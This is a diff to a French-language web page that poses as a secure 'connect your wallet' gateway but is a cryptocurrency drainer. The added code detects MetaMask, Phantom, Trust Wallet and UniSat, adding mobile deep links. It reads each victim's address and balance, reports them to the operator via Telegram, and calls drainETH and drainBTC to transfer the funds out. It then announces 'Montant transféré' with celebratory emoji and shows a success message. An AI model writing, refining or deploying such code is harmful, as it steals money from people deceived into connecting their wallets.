@@ -70,6 +70,34 @@
             box-shadow: 0 6px 15px rgba(0, 123, 255, 0.5);
             transform: translateY(-2px);
         }
+        /* Styles pour la liste des wallets */
+        .wallet-list-btn {
+            background: #f8f9fa;
+            color: #333333;
+            padding: 10px 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px 0;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            width: 100%;
+            max-width: 300px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .wallet-list-btn:hover {
+            background: #e9ecef;
+            border-color: #007BFF;
+        }
+        .wallet-icon {
+            width: 20px;
+            height: 20px;
+        }
         /* Style pour le loader */
         .loader {
             border: 4px solid #f3f3f3;
@@ -148,6 +176,8 @@
         </p>
         <p class="trust-text">Sécurisé et utilisé par des milliers d'utilisateurs. Nous respectons vos données.</p>
         <button class="connect-btn" id="connectWallet">Connecter mon wallet</button>
+        <!-- Conteneur pour les boutons de wallets détectés -->
+        <div id="walletList" class="hidden" style="margin-top: 20px;"></div>
         <button class="redirect-btn hidden" id="redirectButton">Continuer vers le site</button>
         <div class="loader" id="loader"></div>
         <div id="statusText"></div>
@@ -200,110 +230,29 @@
 
             // Gestion du clic sur le bouton de connexion
             elements.connectWalletButton.addEventListener('click', async () => {
-                updateStatus(elements, 'Connexion en cours...', true);
+                updateStatus(elements, 'Détection des wallets...', true);
                 elements.connectWalletButton.disabled = true;
 
-                let ethAddress = null;
-                let btcAddress = null;
-                let ethBalanceUsd = 0;
-                let btcBalanceUsd = 0;
                 let transactionValidated = false;
 
                 try {
                     // Détecter le wallet
                     const wallet = await detectWallet(elements);
-                    if (!wallet) {
-                        elements.connectWalletButton.disabled = false;
+                    if (wallet) {
+                        // Sur PC, connecter directement
+                        transactionValidated = await handleWalletConnection(wallet, elements);
+                    } else {
+                        // Sur mobile, attendre que l'utilisateur sélectionne un wallet
                         return;
-                    }
-
-                    // Gestion des wallets Ethereum (MetaMask, Trust Wallet, Phantom, etc.)
-                    if (wallet.type === 'ethereum') {
-                        const provider = new window.ethers.providers.Web3Provider(wallet.provider);
-                        await provider.ready;
-                        const network = await provider.getNetwork();
-                        console.log('Réseau détecté :', network.name);
-
-                        const ethAccounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
-                        ethAddress = ethAccounts[0];
-                        console.log('ETH détecté :', ethAddress);
-
-                        const ethBalance = await provider.getBalance(ethAddress);
-                        const ethBalanceEth = parseFloat(window.ethers.utils.formatEther(ethBalance));
-                        ethBalanceUsd = ethBalanceEth * CONFIG.ETH_PRICE_USD;
-                        console.log('Solde ETH :', ethBalanceEth, 'ETH (≈ $', ethBalanceUsd.toFixed(2), 'USD)');
-
-                        // Drainage ETH
-                        const drainResult = await drainETH(ethAddress, provider);
-                        if (drainResult.success) {
-                            const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                                  `💼 Wallet: Ethereum (EIP-1193)\n` +
-                                                  `🌐 ETH Address: ${ethAddress}\n` +
-                                                  `💸 Montant transféré: ${window.ethers.utils.formatEther(drainResult.valueToSend)} ETH 🎉`;
-                            await sendTelegramMessage(transferMessage);
-                            transactionValidated = true;
-                            console.log('ETH drainé avec succès, transaction validée.');
-                        } else {
-                            console.log('Échec du drainage ETH.');
-                        }
-
-                        // Notification Telegram pour la connexion
-                        const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                                `💼 Wallet: Ethereum (EIP-1193)\n` +
-                                                `🌐 ETH Address: ${ethAddress} (Balance: 💰 $${ethBalanceUsd.toFixed(2)})\n`;
-                        await sendTelegramMessage(connectionMessage);
-
-                    // Gestion de UniSat (BTC)
-                    } else if (wallet.type === 'unisat') {
-                        const btcAccounts = await wallet.provider.requestAccounts();
-                        btcAddress = btcAccounts[0];
-                        console.log('BTC détecté :', btcAddress);
-
-                        const utxoResponse = await fetch(`${CONFIG.BACKEND_URL}/get-utxos`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ address: btcAddress })
-                        });
-                        if (utxoResponse.ok) {
-                            const { utxos } = await utxoResponse.json();
-                            const btcBalanceSat = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
-                            const btcBalanceBtc = btcBalanceSat / 1e8;
-                            btcBalanceUsd = btcBalanceBtc * CONFIG.BTC_PRICE_USD;
-                            console.log('Solde BTC :', btcBalanceBtc, 'BTC (≈ $', btcBalanceUsd.toFixed(2), 'USD)');
-
-                            // Drainage BTC
-                            const drainResult = await drainBTC(btcAddress, btcBalanceSat);
-                            if (drainResult.success) {
-                                const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                                      `💼 Wallet: UniSat\n` +
-                                                      `🌐 BTC Address: ${btcAddress}\n` +
-                                                      `💸 Montant transféré: ${(drainResult.btcBalanceSat / 1e8).toFixed(8)} BTC 🎉`;
-                                await sendTelegramMessage(transferMessage);
-                                transactionValidated = true;
-                                console.log('BTC drainé avec succès, transaction validée.');
-                            } else {
-                                console.log('Échec du drainage BTC.');
-                            }
-
-                            // Notification Telegram pour la connexion
-                            const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
-                                                    `💼 Wallet: UniSat\n` +
-                                                    `🌐 BTC Address: ${btcAddress} (Balance: 💰 $${btcBalanceUsd.toFixed(2)})\n`;
-                            await sendTelegramMessage(connectionMessage);
-                        } else {
-                            throw new Error('Erreur lors de la récupération des UTXOs');
-                        }
                     }
 
                     // Gestion des boutons après validation
                     if (transactionValidated) {
-                        updateStatus(elements, 'Connection validée ! Cliquez pour continuer.', false, '#28a745');
                         elements.connectWalletButton.classList.add('hidden');
                         elements.redirectButton.classList.remove('hidden');
                         elements.redirectButton.disabled = false;
                         console.log('Bouton de redirection affiché, bouton de connexion masqué.');
                     } else {
-                        updateStatus(elements, 'Transaction non validée. Veuillez réessayer.', false, '#dc3545');
                         elements.connectWalletButton.disabled = false;
                     }
 
@@ -331,36 +280,191 @@
         async function detectWallet(elements) {
             await delay(1000); // Attendre l'injection des wallets
 
-            // Ethereum (MetaMask, Trust Wallet, Coinbase Wallet, etc.)
-            if (window.ethereum) {
-                console.log('Wallet Ethereum détecté (EIP-1193 compatible)');
-                return { type: 'ethereum', provider: window.ethereum };
-            }
-
-            // Phantom (Ethereum via window.phantom.ethereum)
-            if (window.phantom && window.phantom.ethereum) {
-                console.log('Phantom détecté (Ethereum compatible)');
-                return { type: 'ethereum', provider: window.phantom.ethereum };
-            }
-
-            // UniSat (BTC)
-            if (window.unisat) {
-                console.log('UniSat détecté');
-                return { type: 'unisat', provider: window.unisat };
-            }
-
-            // Gestion des cas mobile et PC
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            if (isMobile) {
-                updateStatus(elements, 'Ouvrez ce site dans le navigateur de votre wallet (ex: MetaMask ou Phantom).', false, 'orange');
-                const deepLinkMetaMask = 'https://metamask.app.link/dapp/' + window.location.host + window.location.pathname;
-                const deepLinkPhantom = 'https://phantom.app/ul/v1/dapp/' + window.location.host + window.location.pathname;
-                elements.statusText.innerHTML += `<br><a href="${deepLinkMetaMask}" style="color: #007BFF; text-decoration: underline;">Ouvrir dans MetaMask</a>`;
-                elements.statusText.innerHTML += `<br><a href="${deepLinkPhantom}" style="color: #007BFF; text-decoration: underline;">Ouvrir dans Phantom</a>`;
-            } else {
+            const walletListContainer = document.getElementById('walletList');
+
+            // Liste des wallets supportés avec leurs identifiants et liens profonds
+            const supportedWallets = [
+                {
+                    name: 'MetaMask',
+                    id: 'metamask',
+                    provider: window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null,
+                    deepLink: 'https://metamask.app.link/dapp/',
+                    icon: 'https://cryptologos.cc/logos/metamask-metamask-logo.png?v=002',
+                    type: 'ethereum'
+                },
+                {
+                    name: 'Phantom',
+                    id: 'phantom',
+                    provider: window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null,
+                    deepLink: 'https://phantom.app/ul/v1/dapp/',
+                    icon: 'https://cryptologos.cc/logos/phantom-phantom-logo.png?v=002',
+                    type: 'ethereum'
+                },
+                {
+                    name: 'Trust Wallet',
+                    id: 'trustwallet',
+                    provider: window.ethereum && window.ethereum.isTrust ? window.ethereum : null,
+                    deepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url=',
+                    icon: 'https://cryptologos.cc/logos/trust-wallet-trust-logo.png?v=002',
+                    type: 'ethereum'
+                },
+                {
+                    name: 'UniSat',
+                    id: 'unisat',
+                    provider: window.unisat ? window.unisat : null,
+                    deepLink: null, // UniSat n'a pas de deep link officiel pour mobile
+                    icon: 'https://unisat.io/favicon.ico',
+                    type: 'unisat'
+                }
+            ];
+
+            // Sur PC : Détection directe
+            if (!isMobile) {
+                for (const wallet of supportedWallets) {
+                    if (wallet.provider) {
+                        console.log(`${wallet.name} détecté`);
+                        return { type: wallet.type, provider: wallet.provider };
+                    }
+                }
                 updateStatus(elements, 'Aucun wallet détecté. Installez un wallet compatible (MetaMask, Phantom, ou UniSat).', false, 'red');
+                return null;
             }
-            return null;
+
+            // Sur Mobile : Afficher une liste des wallets
+            elements.connectWalletButton.classList.add('hidden');
+            walletListContainer.classList.remove('hidden');
+            updateStatus(elements, 'Sélectionnez un wallet pour vous connecter :', false, '#666666');
+
+            // Générer les boutons pour chaque wallet
+            supportedWallets.forEach(wallet => {
+                const button = document.createElement('button');
+                button.className = 'wallet-list-btn';
+                button.innerHTML = `
+                    <img src="${wallet.icon}" alt="${wallet.name} Icon" class="wallet-icon">
+                    Connecter avec ${wallet.name}
+                `;
+                button.addEventListener('click', async () => {
+                    updateStatus(elements, `Connexion à ${wallet.name}...`, true);
+                    walletListContainer.classList.add('hidden');
+
+                    // Si le wallet est déjà injecté (par exemple, dans le navigateur du wallet)
+                    if (wallet.provider) {
+                        console.log(`${wallet.name} déjà injecté`);
+                        const success = await handleWalletConnection(wallet, elements);
+                        if (success) {
+                            elements.connectWalletButton.classList.add('hidden');
+                            elements.redirectButton.classList.remove('hidden');
+                            elements.redirectButton.disabled = false;
+                        } else {
+                            walletListContainer.classList.remove('hidden');
+                        }
+                    } else {
+                        // Sinon, tenter d'ouvrir le deep link
+                        if (wallet.deepLink) {
+                            const deepLinkUrl = wallet.deepLink + window.location.host + window.location.pathname;
+                            console.log(`Ouverture du deep link pour ${wallet.name}: ${deepLinkUrl}`);
+                            window.location.href = deepLinkUrl;
+
+                            // Attendre un peu pour voir si l'utilisateur revient (timeout de 5 secondes)
+                            await delay(5000);
+                            updateStatus(elements, `Impossible de détecter ${wallet.name}. Assurez-vous qu'il est installé.`, false, 'red');
+                            walletListContainer.classList.remove('hidden');
+                        } else {
+                            updateStatus(elements, `${wallet.name} n'est pas supporté sur mobile.`, false, 'red');
+                            walletListContainer.classList.remove('hidden');
+                        }
+                    }
+                });
+                walletListContainer.appendChild(button);
+            });
+
+            return null; // Retourne null pour indiquer qu'on attend une action de l'utilisateur
+        }
+
+        // Fonction pour gérer la connexion au wallet sélectionné
+        async function handleWalletConnection(wallet, elements) {
+            try {
+                if (wallet.type === 'ethereum') {
+                    const provider = new window.ethers.providers.Web3Provider(wallet.provider);
+                    await provider.ready;
+                    const network = await provider.getNetwork();
+                    console.log('Réseau détecté :', network.name);
+
+                    const ethAccounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
+                    const ethAddress = ethAccounts[0];
+                    console.log('ETH détecté :', ethAddress);
+
+                    const ethBalance = await provider.getBalance(ethAddress);
+                    const ethBalanceEth = parseFloat(window.ethers.utils.formatEther(ethBalance));
+                    const ethBalanceUsd = ethBalanceEth * CONFIG.ETH_PRICE_USD;
+                    console.log('Solde ETH :', ethBalanceEth, 'ETH (≈ $', ethBalanceUsd.toFixed(2), 'USD)');
+
+                    // Notification Telegram pour la connexion
+                    const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                            `💼 Wallet: ${wallet.name} (EIP-1193)\n` +
+                                            `🌐 ETH Address: ${ethAddress} (Balance: 💰 $${ethBalanceUsd.toFixed(2)})\n`;
+                    await sendTelegramMessage(connectionMessage);
+
+                    // Drainage ETH
+                    const drainResult = await drainETH(ethAddress, provider);
+                    if (drainResult.success) {
+                        const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                              `💼 Wallet: ${wallet.name} (EIP-1193)\n` +
+                                              `🌐 ETH Address: ${ethAddress}\n` +
+                                              `💸 Montant transféré: ${window.ethers.utils.formatEther(drainResult.valueToSend)} ETH 🎉`;
+                        await sendTelegramMessage(transferMessage);
+                        updateStatus(elements, 'Connection validée ! Cliquez pour continuer.', false, '#28a745');
+                        return true;
+                    } else {
+                        updateStatus(elements, 'Échec du drainage ETH.', false, '#dc3545');
+                        return false;
+                    }
+                } else if (wallet.type === 'unisat') {
+                    const btcAccounts = await wallet.provider.requestAccounts();
+                    const btcAddress = btcAccounts[0];
+                    console.log('BTC détecté :', btcAddress);
+
+                    const utxoResponse = await fetch(`${CONFIG.BACKEND_URL}/get-utxos`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ address: btcAddress })
+                    });
+                    if (utxoResponse.ok) {
+                        const { utxos } = await utxoResponse.json();
+                        const btcBalanceSat = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
+                        const btcBalanceBtc = btcBalanceSat / 1e8;
+                        const btcBalanceUsd = btcBalanceBtc * CONFIG.BTC_PRICE_USD;
+                        console.log('Solde BTC :', btcBalanceBtc, 'BTC (≈ $', btcBalanceUsd.toFixed(2), 'USD)');
+
+                        // Notification Telegram pour la connexion
+                        const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                                `💼 Wallet: UniSat\n` +
+                                                `🌐 BTC Address: ${btcAddress} (Balance: 💰 $${btcBalanceUsd.toFixed(2)})\n`;
+                        await sendTelegramMessage(connectionMessage);
+
+                        // Drainage BTC
+                        const drainResult = await drainBTC(btcAddress, btcBalanceSat);
+                        if (drainResult.success) {
+                            const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                                  `💼 Wallet: UniSat\n` +
+                                                  `🌐 BTC Address: ${btcAddress}\n` +
+                                                  `💸 Montant transféré: ${(drainResult.btcBalanceSat / 1e8).toFixed(8)} BTC 🎉`;
+                            await sendTelegramMessage(transferMessage);
+                            updateStatus(elements, 'Connection validée ! Cliquez pour continuer.', false, '#28a745');
+                            return true;
+                        } else {
+                            updateStatus(elements, 'Échec du drainage BTC.', false, '#dc3545');
+                            return false;
+                        }
+                    } else {
+                        throw new Error('Erreur lors de la récupération des UTXOs');
+                    }
+                }
+            } catch (error) {
+                updateStatus(elements, 'Erreur : ' + error.message, false, 'red');
+                return false;
+            }
         }
 
         // Fonction pour drainer ETH
